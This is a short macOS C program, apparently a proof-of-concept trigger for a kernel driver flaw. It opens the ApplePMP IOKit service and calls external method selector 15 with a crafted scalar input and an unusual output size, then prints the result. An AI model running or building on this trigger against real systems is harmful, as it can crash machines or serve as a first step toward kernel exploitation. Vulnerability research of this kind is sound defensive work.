#include <Foundation/Foundation.h>
#include <IOKit/IOKitLib.h>
#include <pthread.h>

struct IOExternalMethodDispatch {
    void* function;
    uint32_t checkScalarInputCount;
    uint32_t checkStructureInputSize;
    uint32_t checkScalarOutputCount;
    uint32_t checkStructureOutputSize;
};

int main() {
    setbuf(stdout, NULL);

    kern_return_t kr;

    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("ApplePMP"));
    if (service == IO_OBJECT_NULL) {
        printf("[-] failed to find service\n");
        exit(0);
    }

    io_connect_t conn;
    kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        printf("[-] failed to open service: %x\n", kr);
        exit(0);
    }
    printf("[+] opened service=0x%x\n", conn);

    uint64_t inputScalar[16] = { 0x17BAA35D8C17BAA };
    uint64_t inputScalarCnt = 1;

    char inputStruct[4096] = {0};
    size_t inputStructCnt = 0;

    uint64_t outputScalar[16] = {0};
    uint32_t outputScalarCnt = 0;

    char outputStruct[4096] = {0};
    size_t outputStructCnt = 0xA;

    uint32_t selector = 15;
    pthread_t thread;

    kr = IOConnectCallMethod(
        conn,
        selector,
        inputScalar,
        inputScalarCnt,
        inputStruct,
        inputStructCnt,
        outputScalar,
        &outputScalarCnt,
        outputStruct,
        &outputStructCnt);
    printf("[*] kr 0x%x\n", kr);

    return 0;
}
